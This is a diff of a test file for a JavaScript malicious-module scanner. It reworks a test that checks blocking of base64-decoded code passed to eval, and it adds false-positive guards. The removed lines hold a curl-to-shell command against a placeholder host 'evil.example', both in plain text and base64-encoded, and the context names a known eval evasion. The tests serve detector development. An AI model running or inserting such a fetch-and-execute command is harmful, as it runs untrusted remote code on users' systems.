@@ -104,16 +104,45 @@ test('eval with string concatenation bypass is a known bypass [EXPECTED BYPASS]'
   }
 });
 
-// 4. Base64-encoded payload decoded via Buffer.from – signature scanner catches 'buffer.from'
-test('Buffer.from base64 decode is blocked by signature scanner', () => {
+// 4. Base64-encoded payload decoded via Buffer.from then eval'd – behavioral
+// OBFUSCATED_CODE_EXECUTION rule catches the decode+exec combination (F-31).
+// NOTE: this fixture is deliberately COMMENT-FREE. A prior version carried a
+// `// Encodes: require('child_process').exec(...)` comment whose plaintext
+// child_process/exec strings (matched against raw content) completed
+// DYNAMIC_CODE_EXEC_CHAIN — so the test "passed" for the wrong reason and masked
+// a real gap: strip the comment and the payload used to run (action=OBSERVE).
+// It must now block on the decode→eval sequence alone.
+test('Buffer.from base64 decode + eval is blocked by OBFUSCATED_CODE_EXECUTION', () => {
   const src = pad(`
-    // Encodes: require('child_process').exec('curl http://evil.example/payload | sh')
-    const payload = Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgaHR0cDovL2V2aWwuZXhhbXBsZS9wYXlsb2FkIHwgc2gnKQ==', 'base64').toString();
+    const payload = Buffer.from('cGF5bG9hZCBnb2VzIGhlcmU=', 'base64').toString();
     eval(payload);
     module.exports = {};
   `);
   const result = detector.scanModuleSync('base64-payload.js', src, 'base64-payload.js');
   expectBlocked(result);
+  const isObfuscated = result.detections.some(d => d.rule === 'OBFUSCATED_CODE_EXECUTION');
+  assert.ok(isObfuscated, 'Expected OBFUSCATED_CODE_EXECUTION behavioral detection');
+});
+
+// 4b. Regression guard for the F-31 gap surface: the decode primitive and the eval
+// must BOTH be real code for the rule to fire. A decode named only in a comment must
+// NOT manufacture a block (codeDecode is matched against comment-stripped scanSrc),
+// and neither primitive blocks alone (F-20 keeps bare eval/Buffer.from WARN-only).
+test('Decode-only and eval-only modules do NOT false-positive (F-31 guard)', () => {
+  // legit: JWT/HTTP libraries decode base64 constantly, never eval it
+  const decodeOnly = pad(`const raw = Buffer.from(token, 'base64').toString('utf8'); module.exports = JSON.parse(raw);`);
+  const r1 = detector.scanModuleSync('decode-only.js', decodeOnly, 'decode-only.js');
+  assert.ok(!r1.detections.some(d => !d.warnOnly), 'decode-only must not hard-block');
+
+  // legit: build tool evaluates a constant expression, no decode
+  const evalOnly = pad(`module.exports = eval('1 + 2');`);
+  const r2 = detector.scanModuleSync('eval-only.js', evalOnly, 'eval-only.js');
+  assert.ok(!r2.detections.some(d => !d.warnOnly), 'eval-only must not hard-block');
+
+  // a decode mentioned only in a comment + a real eval must NOT block
+  const commentDecode = pad(`// Buffer.from(x, 'base64') would decode it\nmodule.exports = eval('40 + 2');`);
+  const r3 = detector.scanModuleSync('comment-decode.js', commentDecode, 'comment-decode.js');
+  assert.ok(!r3.detections.some(d => !d.warnOnly), 'comment-only decode must not manufacture a block');
 });
 
 // 5. Crypto-miner stratum reference – signature scanner catches 'stratum'
